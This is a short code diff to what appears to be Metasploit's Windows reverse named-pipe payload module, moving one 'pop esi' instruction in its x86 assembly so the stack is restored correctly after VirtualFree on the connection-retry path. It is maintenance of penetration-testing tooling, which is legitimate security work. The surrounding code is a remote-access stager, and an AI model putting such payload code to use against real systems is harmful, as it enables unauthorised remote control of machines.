@@ -245,6 +245,8 @@ module Payload::Windows::ReverseNamedPipe
         push eax                ; lpAddress
         push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualFree')}
         call ebp                ; VirtualFree(payload, 0, MEM_DECOMMIT)
+        ; restore the stack (one more pop after 2nd ReadFile call)
+        pop esi
 
       cleanup_file:
         ; clear up the named pipe handle
@@ -253,7 +255,6 @@ module Payload::Windows::ReverseNamedPipe
         call ebp                ; CloseHandle(...)
 
         ; restore the stack back to the connection retry count
-        pop esi
         pop esi
         pop esi
         dec [esp]               ; decrement the counter
